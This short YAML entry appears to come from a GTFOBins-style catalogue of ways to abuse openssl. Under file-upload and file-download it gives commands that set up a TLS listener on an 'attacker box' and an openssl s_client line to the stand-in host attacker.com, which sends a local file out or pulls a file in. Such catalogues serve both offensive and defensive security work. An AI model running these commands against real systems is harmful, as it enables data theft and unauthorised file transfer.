---
functions:
  file-upload:
    - description: |
        To collect the file run the following on the attacker box:

            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save

        Send a local file via TCP. Transmission will be encrypted.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
  file-download:
    - description: |
        To send the file run the following on the attacker box:

            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send

        Fetch a file from a TCP port, transmission will be encrypted.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_save
        openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
---
